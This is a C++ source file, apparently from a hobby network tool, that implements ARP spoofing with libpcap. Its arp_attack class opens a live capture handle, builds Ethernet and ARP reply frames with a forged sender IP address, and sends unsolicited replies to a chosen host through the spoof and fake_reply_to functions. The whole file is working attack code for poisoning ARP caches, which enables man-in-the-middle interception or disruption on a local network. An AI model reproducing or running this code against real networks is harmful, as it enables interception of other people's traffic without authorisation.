//
// Created by kenny on 1/6/19.
//

#include "arpspf.h"

#include "hdrs.h"
#include "fields.h"

namespace kni {

    arp_packet_base::arp_packet_base(size_t bufsize) {
        assert(bufsize >= fake_arp_hdr::bytes() + fake_ether_hdr::bytes());

        sndbuf = new u_char[bufsize];
        sndbufsize = bufsize;
        allocbuf = true;
    }

    arp_packet_base::arp_packet_base(u_char *buf, size_t bufsize) {
        assert(bufsize >= fake_ether_hdr::bytes() + fake_arp_hdr::bytes());

        sndbuf = buf;
        sndbufsize = bufsize;
        allocbuf = false;
    }

    void arp_packet_base::construct_packets() {
        hdr_ether = new fake_ether_hdr(sndbuf);
        hdr_arp = new fake_arp_hdr(sndbuf + fake_ether_hdr::bytes());
    }

    arp_packet_base::~arp_packet_base() {
        delete hdr_ether;
        hdr_ether = nullptr;

        delete hdr_arp;
        hdr_arp = nullptr;

        if (allocbuf)
            delete[] sndbuf;
        sndbuf = nullptr;
    }

    arp_attack::arp_attack(netinfo *pinfo, size_t sndsize, size_t errsize)
            : arp_packet_base(sndsize), buffered_error(errsize), netdb(pinfo) {

    }

    arp_attack::arp_attack(netinfo *pinfo, u_char *buf, size_t bufsize, size_t errsize)
            : arp_packet_base(buf, bufsize), buffered_error(errsize), netdb(pinfo) {

    }

    bool arp_attack::open() {
        handle = pcap_open_live(netdb->devname.c_str(), 2048, 1, 0, error_buffer());
        return handle != nullptr;
    }

    void arp_attack::apply_default_values() {
        hdr_ether->src = netdb->devinfo.hw_addr;
        //hdr_ether->dst =
        hdr_ether->type = ETH_P_ARP;

        hdr_arp->htype = ARPHRD_ETHER;
        hdr_arp->ptype = ETH_P_IP;
        hdr_arp->hlen = 6;
        hdr_arp->plen = 4;
        hdr_arp->oper = ARPOP_REPLY;
        hdr_arp->sha = netdb->devinfo.hw_addr;
        hdr_arp->spa = netdb->devinfo.ip;
        //hdr_arp->tha =
        //hdr_arp->tpa =
    }

    arp_attack::~arp_attack() {
        if (handle)
            pcap_close(handle);
    }

    void arp_attack::set_fake_ip(const std::string &ip) {
        hdr_arp->spa = ip;
    }

    bool arp_attack::fake_reply_to(const std::string &ip) {
        if (!netdb->cached(ip)) {
            snprintf(error_buffer(), error_bufsize(), "%s not detected", ip.c_str());
            return false;
        }

        hdr_ether->dst = netdb->map(ip);

        hdr_arp->tpa = ip;
        hdr_arp->tha = netdb->map(ip);

        if (pcap_sendpacket(handle, buffer(), ETHER_HDR_LEN + ARP_HDR_LEN) == PCAP_ERROR) {
            snprintf(error_buffer(), error_bufsize(), "%s", pcap_geterr(handle));
            return false;
        } else {
            return true;
        }
    }

    void arp_attack::set_fake_ip(ipv4_t ipv4) {
        hdr_arp->spa = ipv4;
    }

    bool arp_attack::spoof(const std::string &fake_src, const std::string &dst) {
        set_fake_ip(fake_src);
        return fake_reply_to(dst);
    }


}